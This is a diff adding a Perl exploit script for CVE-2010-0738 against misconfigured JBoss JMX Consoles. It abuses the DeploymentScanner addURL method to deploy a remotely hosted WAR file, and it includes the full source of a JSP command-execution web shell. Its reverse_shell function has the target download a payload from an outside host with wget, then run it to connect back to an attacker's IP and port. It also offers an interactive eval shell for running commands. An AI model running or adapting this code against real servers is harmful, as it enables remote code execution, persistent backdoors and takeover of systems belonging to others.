@@ -1,0 +1,436 @@
+#!/usr/bin/perl
+# Exploit Title: JBoss, JMX Console, misconfigured DeploymentScanner
+# Date: Oct 3 2011
+# Author: y0ug <at> codsec.com
+# Version: 
+# Tested on: Linux
+# CVE : CVE-2010-0738
+#
+# POC against misconfigured JBoss JMX Console
+# It use the addUrl method in DeploymentScanner module
+#
+# More information
+# http://packetstormsecurity.org/files/download/105479/JBossWhitepaper.pdf
+# http://poc-hack.blogspot.com/2011/02/how-to-hack-any-version-of-jboss.html
+#
+# You need to edit
+#    $url_cmd to match the war payload url
+#    $url_shell is your reverse shell url 
+#         ( only if you want to use reverse_shell("ip", "port") )
+#
+# The JSP shell is not mine is available every where
+# I add a -b param that build the war contener to do this you need java
+#
+# Is a fast POC coded this morning for fun so maybe it don't cover all case/version
+#
+# Usage:
+#  Build the war contener (need java)
+#   ./jboss -b
+#  Hack
+#   ./jboss http://www.vuln.com:8080
+
+use strict;
+
+use LWP::UserAgent;
+use HTTP::Request::Common qw(POST);
+use HTTP::Request::Common qw(GET);
+use IO::Socket::SSL;
+use Cwd;
+
+# configuration section
+my $url_cmd = "http://127.0.0.1/cmd.war";
+my $url_shell = "http://127.0.0.1/reverse.pl";
+my $debug = 0; # 1 to switch to debug
+my $useragent = "'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) ".      
+    "Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729)'";
+
+# Don't edit from here
+my $installed = 0;
+my $url;
+
+my $ua = LWP::UserAgent->new;
+
+$SIG{INT} = "sigtrap";
+
+sub debug {
+    if( $debug ){
+        print STDERR "debug: ", @_, "\n";
+    }
+}
+
+sub check_url {
+    my $request = GET "$url/jmx-console/";
+    my $response = $ua->request($request);
+    if (!$response->is_success) {
+        print STDERR $response->status_line, "\n";
+        return -1;
+    }
+    return 0;
+}
+
+sub sigtrap {
+    if ( $installed ){
+        print " [*] Clean of $url in progress...\n";
+        clean_war();
+    }
+    exit 1;
+}
+
+sub find_method_index {
+    my $method = shift(@_);
+
+    my $request = GET "$url/jmx-console/HtmlAdaptor?" . 
+    "action=inspectMBean&name=jboss.deployment" .
+    "%3Aflavor%3DURL%2Ctype%3DDeploymentScanner";
+   
+    
+    my $response = $ua->request($request);
+    if (!$response->is_success) {
+        print STDERR $response->status_line, "\n";
+        return -1;
+    }
+    my $page = $response->decoded_content;
+    
+    # Match a certain jboss version
+    while ( $page =~ m{<form method="post" action="HtmlAdaptor">(.*?)</form>}sg ){
+        my $form = $1;
+        if ( $form =~ /$method/ ){
+            if ( $form =~ /<input type="hidden" name="methodIndex" value="(\d+)">/ ){
+                debug("method $method at index $1");
+                return $1;
+            }
+        }
+    }
+    
+    # Match another jboss version
+    while ( $page =~ m{<td class='param'>$method</td>(.*?)</tr>}sg ){
+        my $form = $1;
+        if ( $form =~ /<input type='hidden' name='methodIndex' value='(\d+)'\/>/ ){
+            debug("method $method at index $1");
+            return $1;
+        }
+    }
+    
+    # Match another jboss version
+    while ( $page =~ m{<span class='aname'>$method</span>(.*?)<table>}sg ){
+        my $form = $1;
+        if ( $form =~ /<input type="hidden" name="methodIndex" value="(\d+)" \/>/ ){
+            debug("method $method at index $1");
+            return $1;
+        }
+    }    
+    return -1;
+}
+
+sub is_installed_war {
+    my $method_index = find_method_index("hasURL");
+    if ( $method_index < 0 ) { print "Can't find methodIndex for hasURL\n"; return -1; }
+    my $request = POST "$url/jmx-console/HtmlAdaptor", { action => 'invokeOp', 
+        name => 'jboss.deployment:type=DeploymentScanner,flavor=URL',
+        methodIndex => "$method_index", arg0 => $url_cmd};
+    my $response = $ua->request($request);
+    if (!$response->is_success) {
+        print STDERR $response->status_line, "\n";
+        return -1;
+    }
+    my $page = $response->decoded_content;
+
+    if ( $page =~ m{<pre>(.*?)</pre>}s ){
+        my $ret = $1;
+        if ( $ret =~ /true/ ){
+            return 1;
+        }else{
+            return 0;
+        }
+    }else{
+        print STDERR "error: occured during is_installed_war regex!\n";
+        return -2;
+    }
+}
+
+sub install_war {
+    if (is_installed_war == 1){
+        print " [*] Install canceled, already installed\n";
+        return 1;
+    }
+    my $method_index = find_method_index("addURL");
+    if ( $method_index < 0 ) { print "Can't find methodIndex for addURL\n"; return -1; }
+    
+    my $request = POST "$url/jmx-console/HtmlAdaptor", { action => 'invokeOp', 
+        name => 'jboss.deployment:type=DeploymentScanner,flavor=URL',
+        methodIndex => "$method_index", arg0 => $url_cmd};
+    my $response = $ua->request($request);
+    if (!$response->is_success) {
+        print STDERR $response->status_line, "\n";
+        return -1;
+    }
+    my $page = $response->decoded_content;
+    
+    if ( $page =~ m{<span class='OpResult'>(.*?)</span>}s ){
+        print " [*] ", trim($1), "\n";
+        return 0;
+    }elsif ( $page =~ m{<pre>(.*?)</pre>}s ){
+        print " [*] ", trim($1), "\n";
+        return 0;
+    }elsif ( $page =~ m{</table>(.*?)</body>}s ){
+        print " [*] ", trim($1), "\n";
+        return 0;
+    }else{
+        print STDERR "error: occured during install_war regex!\n";
+        return -1;
+    }
+}
+
+sub clean_war {
+    while(is_installed_war == 1){
+        if ( uninstall_war() < 0 ){
+            return -1;
+        }
+    }
+    print " [*] Clean complete\n";
+    return 0;
+}
+
+sub uninstall_war {
+    my $method_index = find_method_index("removeURL");
+    if ( $method_index < 0 ) { print "Can't find methodIndex for removeURL\n"; return -1; }
+    my $request = POST "$url/jmx-console/HtmlAdaptor", { action => 'invokeOp', 
+        name => 'jboss.deployment:type=DeploymentScanner,flavor=URL',
+        methodIndex => "$method_index", arg0 => $url_cmd};
+    my $response = $ua->request($request);
+    if (!$response->is_success) {
+        print STDERR $response->status_line, "\n";
+        return -1;
+    }
+    my $page = $response->decoded_content;
+    
+    if ( $page =~ m{<span class='OpResult'>(.*?)</span>}s ){
+        print " [*] ", trim($1), "\n";
+        return 0;
+    }elsif ( $page =~ m{<pre>(.*?)</pre>}s ){
+        print " [*] ", trim($1), "\n";
+        return 0;
+    }elsif ( $page =~ m{</table>(.*?)</body>}s ){
+        print " [*] ", trim($1), "\n";
+        return 0;
+    }else{
+        print STDERR "error: occured during uninstall_war regex!\n";
+        return -1;
+    }
+}
+
+sub execute {
+    my $cmd = shift(@_);
+    print '$ ' . $cmd . "\n";
+    
+    my $request = POST "$url/cmd/cmd.jsp", { cmd => $cmd};
+    my $response = $ua->request($request);
+    if (!$response->is_success) {
+        if ( $response->code == 404 ){
+            print STDERR "Command war contener is not installed!\n";
+        }else{
+            print STDERR $response->status_line, "\n";
+        }
+        return -1;
+    }
+    my $page = $response->decoded_content;
+    
+    my $content = $page;
+
+    if ( $content =~ m{<BR>(.*)</pre>}s ){
+        print trim($1) . "\n";
+        return 0;
+    }else{
+        print STDERR "error: occured during exec regex!\n";
+        return -1;
+    }
+}
+
+sub reverse_shell {
+    my ($ip, $port) = @_;
+    print " [*] reverse shell to $ip $port\n";
+    my $cmd = "wget -O /tmp/a $url_shell";
+    if ( execute($cmd) < 0 ){
+        return -1;
+    }
+    if ( execute("chmod +x /tmp/a") < 0 ){
+        return -1;
+    }
+    return execute("/tmp/a $ip $port");
+}
+
+sub trim($){
+	my $string = shift;
+	$string =~ s/^\s+//;
+	$string =~ s/\s+$//;
+	return $string;
+}
+
+sub setup {
+    print " [*] Check url $url...\n";
+    if ( check_url() < 0 ){
+        print "Url $url not available!\n";
+        return -1;
+    }
+    
+    print " [*] Try to install command war contener...\n";
+    return install_war;
+}
+
+sub check_cmd {
+    my $t = 5;
+    for( my $i = 1; $i <= $t ; ++$i ){
+        my $request = GET "$url/cmd/cmd.jsp";
+        my $response = $ua->request($request);
+        if (!$response->is_success) {
+            if ( $response->code != 404 ){
+                print STDERR $response->status_line, "\n";
+                return 0;
+            }
+            print(" [*] check_cmd $i/$t failed\n");
+        }else{
+            print(" [*] check_cmd $i/$t ok, gogogo!\n");
+            return 1;
+        }
+        if ( $i < $t-1) {sleep(15); }
+   }
+   return 0;
+}
+
+sub help {
+    print "Help\n";
+    print " - Is a perl shell so you can call perl function\n";
+    print " > execute(\"id\") # execute the commande\n";
+    print " > reverse_shell(\"8.8.8.8\", \"1912\") # download your reverse shell and execute it\n";
+    print " > clean # remove the war contener from the server\n";
+    print " > check_cmd # loop until command available\n";
+    print " > install_war # install the war contener from url\n";
+    print " > exit # clean and quit\n";
+    print " > exitd # exit without cleaning\n";
+}
+
+sub build_war {
+    my $jsp_file = "cmd.jsp";
+    open( my $jsp_output, '>', $jsp_file ) or 
+        die("Can't open $jsp_file : $!");
+
+    print $jsp_output <<EOF;
+<%@ page import="java.util.*,java.io.*"%>
+<%
+%>
+<HTML><BODY>
+Commands with JSP
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+out.println("Command: " + request.getParameter("cmd") + "<BR>");
+Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+OutputStream os = p.getOutputStream();
+InputStream in = p.getInputStream();
+DataInputStream dis = new DataInputStream(in);
+String disr = dis.readLine();
+while ( disr != null ) {
+out.println(disr);
+disr = dis.readLine();
+}
+}
+%>
+</pre>
+</BODY></HTML>
+EOF
+
+    close($jsp_output);
+
+    mkdir "WEB-INF";
+    my $xml_file = "WEB-INF/web.xml";
+    open( my $xml_output, '>', $xml_file ) or 
+        die("Can't open $xml_file : $!");
+    print $xml_output <<EOF;
+<?xml version="1.0" ?>
+<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
+http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
+version="2.4">
+<servlet>
+<servlet-name>Command</servlet-name>
+<jsp-file>/cmd.jsp</jsp-file>
+</servlet>
+</web-app>
+EOF
+    close($xml_output);
+
+    system("jar cvf cmd.war WEB-INF/ $jsp_file");
+    unlink($xml_file);
+    unlink($jsp_file);
+    rmdir("WEB-INF");
+    
+    print " [*] War contener is here ", getcwd, "/cmd.war\n";
+    print " [*] Upload it to your server and update script url\n";
+}
+
+sub shell {
+    do {
+        print("> ");
+        chop($_ = <STDIN>);
+        if ( $_ eq "help" ) { help(); }
+        if ( $_ eq "exitd" ) { exit 0; }
+        elsif ( $_ ne "exit" ){  eval($_); }
+        warn() if $@;
+    } while ($_ ne "exit");
+}
+
+if($#ARGV+1 != 1){
+    print " [*] Exploit Title: JBoss, JMX Console, misconfigured DeploymentScanner\n";
+    print " [*] Date: Oct 3 2011\n";
+    print " [*] Author: y0ug <at> codsec.com\n";
+    print " [*] Version: 0.1\n";
+    print " [*] JSP shell url $url_cmd\n\n";
+    print " [*] Usage:\n";
+    print "  Build the war contener (need java)\n";
+    print " $0 -b\n";
+    print "  Hack\n";
+    print " $0 http://www.vuln.com:8080\n\n";
+    
+    
+    exit 1;
+}
+
+if($ARGV[0] eq "-b"){
+    build_war;
+    exit 0;
+}
+
+$url = $ARGV[0];
+
+$ua->agent($useragent);
+
+print " [*] JSP shell url $url_cmd\n";
+
+if ( setup() < 0 ){
+    print " [*] Setup failed!\n";
+    exit 1;
+}
+$installed = 1;
+print " [*] Wait few minutes, times to JBoss to load the url\n";
+print " [*] You can find the shell here too\n";
+print " [*] $url/cmd/cmd.jsp\n";
+
+if ( check_cmd() <= 0 ){
+    print " [*] ## Exploit certainly failed! ##\n";
+    print " [*] You can wait a little longer (run > check_cmd)\n";
+}else{
+    print " [*] Congrats, is up!\n";
+    execute("id");
+}
+
+shell();
+
+print " [*] Clean of $url in progress...\n";
+clean_war();
+
+exit(0);
